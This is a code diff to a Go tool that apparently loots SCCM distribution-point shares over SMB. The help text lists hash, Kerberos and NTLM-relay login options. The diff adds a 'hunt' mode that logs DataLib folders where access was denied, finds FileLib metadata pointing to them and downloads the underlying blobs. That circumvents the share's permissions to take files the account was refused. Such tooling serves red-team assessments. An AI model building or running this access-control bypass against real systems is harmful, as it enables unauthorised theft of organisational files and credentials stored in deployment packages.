@@ -32,6 +32,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	rundebug "runtime/debug"
@@ -117,6 +118,56 @@ func parseINIFile(data []byte) (hash string, size int, err error) {
 	}
 	size, err = strconv.Atoi(string(matches[1]))
 	return
+}
+
+func noAccessFilename(inventory string) string {
+	dir, filename := path.Split(inventory)
+	extension := path.Ext(filename)
+	base := strings.TrimSuffix(filename, extension)
+	return path.Join(dir, base+"_noaccess"+extension)
+}
+
+func loadNoAccessEntries(filename string) (map[string]struct{}, error) {
+	f, err := os.Open(filename)
+	if err != nil {
+		return nil, err
+	}
+	defer f.Close()
+
+	entries := make(map[string]struct{})
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		entry := strings.TrimSpace(scanner.Text())
+		if entry != "" {
+			entries[strings.ToLower(entry)] = struct{}{}
+		}
+	}
+	return entries, scanner.Err()
+}
+
+func fileLibReferences(data []byte) []string {
+	var references []string
+	for _, line := range strings.Split(string(data), "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "[") || strings.HasPrefix(line, ";") {
+			continue
+		}
+		key, _, found := strings.Cut(line, "=")
+		key = strings.TrimSpace(key)
+		if found && key != "" {
+			references = append(references, key)
+		}
+	}
+	return references
+}
+
+func matchingReference(data []byte, noAccessEntries map[string]struct{}) (string, bool) {
+	for _, reference := range fileLibReferences(data) {
+		if _, found := noAccessEntries[strings.ToLower(reference)]; found {
+			return reference, true
+		}
+	}
+	return "", false
 }
 
 func writeInventoryLinesToFile(f *os.File, names <-chan string) error {
@@ -262,11 +313,14 @@ func downloadFile(session *smb.Connection, file string, skipFilters bool) {
 	return
 }
 
-func listFilesRecursively(session *smb.Connection, share, dir string, callback func(name string) error) (err error) {
+func listFilesRecursively(session *smb.Connection, share, dir string, callback func(name string) error, onAccessDenied func(string)) (err error) {
 	files, err := session.ListDirectory(share, dir, "*")
 	if err != nil {
 		if err == smb.StatusMap[smb.StatusAccessDenied] {
 			log.Errorf("Could connect to [%s] but listing files in directory (%s) was prohibited\n", share, dir)
+			if onAccessDenied != nil {
+				onAccessDenied(dir)
+			}
 			return
 		}
 		log.Errorln(err)
@@ -275,7 +329,7 @@ func listFilesRecursively(session *smb.Connection, share, dir string, callback f
 
 	for _, file := range files {
 		if file.IsDir && !file.IsJunction {
-			err = listFilesRecursively(session, share, file.FullPath, callback)
+			err = listFilesRecursively(session, share, file.FullPath, callback, onAccessDenied)
 			if err != nil {
 				log.Errorf("Failed to list files in directory %s with error: %s\n", file.FullPath, err)
 				continue
@@ -291,7 +345,7 @@ func listFilesRecursively(session *smb.Connection, share, dir string, callback f
 	return
 }
 
-func buildInventory(session *smb.Connection, share string, callback func(path string) error) (err error) {
+func buildInventory(session *smb.Connection, share string, callback func(path string) error, onAccessDenied func(path string)) (err error) {
 	log.Noticef("Attempting to open share: %s and list content\n", share)
 
 	// Connect to share
@@ -351,7 +405,7 @@ func buildInventory(session *smb.Connection, share string, callback func(path st
 			fmt.Printf("\r%s\r", string(make([]byte, 80)))
 			fmt.Printf("\rCollecting INI files in (%s), %d thus far, in folder (%d/%d) ", folder.FullPath, numFiles, i, numFolders)
 			return nil
-		})
+		}, onAccessDenied)
 		if err != nil {
 			log.Errorf("Failed to list files in directory %s with error: %s\n", folder.FullPath, err)
 			continue
@@ -360,6 +414,81 @@ func buildInventory(session *smb.Connection, share string, callback func(path st
 	fmt.Println()
 
 	return
+}
+
+func remoteBase(filename string) string {
+	parts := strings.Split(filename, "\\")
+	return parts[len(parts)-1]
+}
+
+func huntFileLib(session *smb.Connection, share, noAccessFile, outDir string) error {
+	noAccessEntries, err := loadNoAccessEntries(noAccessFile)
+	if err != nil {
+		return fmt.Errorf("read no-access file: %w", err)
+	}
+	if len(noAccessEntries) == 0 {
+		return fmt.Errorf("no-access file %s contains no entries", noAccessFile)
+	}
+
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return err
+	}
+	manifest, err := os.OpenFile(path.Join(outDir, "hunt-manifest.tsv"), os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0640)
+	if err != nil {
+		return err
+	}
+	defer manifest.Close()
+	if _, err := fmt.Fprintln(manifest, "hash\treference\tfile"); err != nil {
+		return err
+	}
+
+	if err := session.TreeConnect(share); err != nil {
+		return err
+	}
+	defer session.TreeDisconnect(share)
+
+	downloaded := make(map[string]struct{})
+	return listFilesRecursively(session, share, "FileLib", func(metaPath string) error {
+		if !strings.EqualFold(path.Ext(remoteBase(metaPath)), ".ini") {
+			return nil
+		}
+
+		metadata := bytes.NewBuffer(nil)
+		if err := session.RetrieveFile(share, metaPath, 0, metadata.Write); err != nil {
+			return fmt.Errorf("read FileLib metadata %s: %w", metaPath, err)
+		}
+		reference, matched := matchingReference(metadata.Bytes(), noAccessEntries)
+		if !matched {
+			return nil
+		}
+
+		hash := strings.TrimSuffix(remoteBase(metaPath), path.Ext(remoteBase(metaPath)))
+		if len(hash) < 4 {
+			return fmt.Errorf("invalid FileLib metadata name %s", metaPath)
+		}
+		if _, exists := downloaded[hash]; exists {
+			return nil
+		}
+		downloaded[hash] = struct{}{}
+
+		localName := fmt.Sprintf("%s-%s", hash[:4], remoteBase(reference))
+		localPath := path.Join(outDir, localName)
+		f, err := os.OpenFile(localPath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0640)
+		if err != nil {
+			return err
+		}
+		defer f.Close()
+
+		blobPath := strings.TrimSuffix(metaPath, path.Ext(metaPath))
+		if err := session.RetrieveFile(share, blobPath, 0, f.Write); err != nil {
+			return fmt.Errorf("download FileLib blob %s: %w", blobPath, err)
+		}
+		if _, err := fmt.Fprintf(manifest, "%s\t%s\t%s\n", hash, reference, localName); err != nil {
+			return err
+		}
+		log.Noticef("Hunt matched %s and downloaded %s\n", reference, localName)
+		return nil
+	}, nil)
 }
 
 var helpMsg = `
@@ -379,9 +508,11 @@ var helpMsg = `
           --dc-ip               Optionally specify ip of KDC when using Kerberos authentication
           --target-ip           Optionally specify ip of target when using Kerberos authentication
           --aes-key             Use a hex encoded AES128/256 key for Kerberos authentication
-          --inventory           File to store (or read from) all indexed filepaths (default sccmfiles.txt)
-          --download <outdir>   Downloads all the files referenced by the inventory file to the <outdir>
-          --single-file <path>  Download a single file with a specified path to the DataLib formatted as in the inventory file
+		  --inventory           File to store (or read from) all indexed filepaths (default sccmfiles.txt)
+		  --download <outdir>   Downloads all the files referenced by the inventory file to the <outdir>
+		  --single-file <path>  Download a single file with a specified path to the DataLib formatted as in the inventory file
+		  --hunt                Search FileLib for blobs referenced by inaccessible DataLib entries
+		  --noaccess-file       File containing inaccessible DataLib entries (default: derived from --inventory)
           --relay               Start an SMB listener that will relay incoming
                                 NTLM authentications to the remote server and
                                 use that connection. NOTE that this forces SMB 2.1
@@ -406,9 +537,9 @@ var helpMsg = `
 `
 
 func main() {
-	var host, username, password, hash, domain, shareFlag, includeName, includeExt, excludeExt, singleFile, socksIP, targetIP, dcIP, aesKey string
+	var host, username, password, hash, domain, shareFlag, includeName, includeExt, excludeExt, singleFile, socksIP, targetIP, dcIP, aesKey, noAccessFile string
 	var port, dialTimeout, socksPort, relayPort int
-	var debug, noEnc, forceSMB2, localUser, nullSession, version, verbose, relay, noPass, kerberos bool
+	var debug, noEnc, forceSMB2, localUser, nullSession, version, verbose, relay, noPass, kerberos, hunt bool
 	var err error
 
 	flag.Usage = func() {
@@ -436,6 +567,8 @@ func main() {
 	flag.StringVar(&inventoryFile, "inventory", "sccmfiles.txt", "")
 	flag.StringVar(&downloadDir, "download", "", "")
 	flag.StringVar(&singleFile, "single-file", "", "")
+	flag.BoolVar(&hunt, "hunt", false, "")
+	flag.StringVar(&noAccessFile, "noaccess-file", "", "")
 	flag.BoolVar(&noEnc, "noenc", false, "")
 	flag.BoolVar(&forceSMB2, "smb2", false, "")
 	flag.BoolVar(&localUser, "local", false, "")
@@ -491,7 +624,20 @@ func main() {
 		return
 	}
 
-	if isFlagSet("download") {
+	if hunt {
+		if singleFile != "" {
+			log.Errorln("--hunt cannot be combined with --single-file")
+			flag.Usage()
+			return
+		}
+		if downloadDir == "" {
+			downloadDir = "CMLootOut"
+		}
+		if noAccessFile == "" {
+			noAccessFile = noAccessFilename(inventoryFile)
+		}
+		download = true
+	} else if isFlagSet("download") {
 		download = true
 		if downloadDir == "" {
 			downloadDir = "."
@@ -709,7 +855,14 @@ func main() {
 		return
 	}
 
-	if !download {
+	if hunt {
+		err = huntFileLib(session, shareFlag, noAccessFile, downloadDir)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		log.Noticef("Hunt complete. Results and manifest written to %s\n", downloadDir)
+	} else if !download {
 		// Check if inventory file can be created or if it already exists
 		f, err := os.OpenFile(inventoryFile, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0644)
 		if err != nil {
@@ -722,23 +875,47 @@ func main() {
 		}
 		defer f.Close()
 
+		noAccessFile := noAccessFilename(inventoryFile)
+		noAccess, err := os.OpenFile(noAccessFile, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0644)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+
 		log.Noticeln("[+] Building inventory file")
 		inventoryLineChan := make(chan string)
+		var writers sync.WaitGroup
+		writers.Add(1)
 		go func() {
+			defer writers.Done()
 			err := writeInventoryLinesToFile(f, inventoryLineChan)
 			if err != nil {
 				log.Errorf("Failed to write to inventory file with error: %s\n", err)
-				// Perhaps something less drastic?
-				os.Exit(1)
 			}
 		}()
+		noAccessWriter := bufio.NewWriter(noAccess)
 
 		// Build the index
 		err = buildInventory(session, shareFlag, func(path string) error {
 			name := fmt.Sprintf("\\\\%s\\%s\\%s\n", host, shareFlag, strings.TrimSuffix(path, ".INI"))
 			inventoryLineChan <- name
 			return nil
+		}, func(accessDeniedPath string) {
+			entry := remoteBase(accessDeniedPath)
+			if _, err := fmt.Fprintln(noAccessWriter, entry); err != nil {
+				log.Errorf("Failed to write inaccessible DataLib entry: %s\n", err)
+			}
 		})
+		close(inventoryLineChan)
+		writers.Wait()
+		if flushErr := noAccessWriter.Flush(); flushErr != nil {
+			log.Errorln(flushErr)
+			return
+		}
+		if closeErr := noAccess.Close(); closeErr != nil {
+			log.Errorln(closeErr)
+			return
+		}
 
 		if err != nil {
 			log.Errorln(err)
@@ -746,6 +923,14 @@ func main() {
 		}
 
 		log.Noticef("[+] Inventory written to file %s\n", inventoryFile)
+		info, statErr := noAccess.Stat()
+		if statErr == nil && info.Size() > 0 {
+			log.Noticef("[+] Inaccessible DataLib entries written to %s; use --hunt to search FileLib\n", noAccessFile)
+		} else if statErr == nil {
+			if err := os.Remove(noAccessFile); err != nil {
+				log.Debugf("Failed to remove empty no-access file %s: %s\n", noAccessFile, err)
+			}
+		}
 	} else {
 		// Create download directory
 		err = os.Mkdir(downloadDir, 0755)
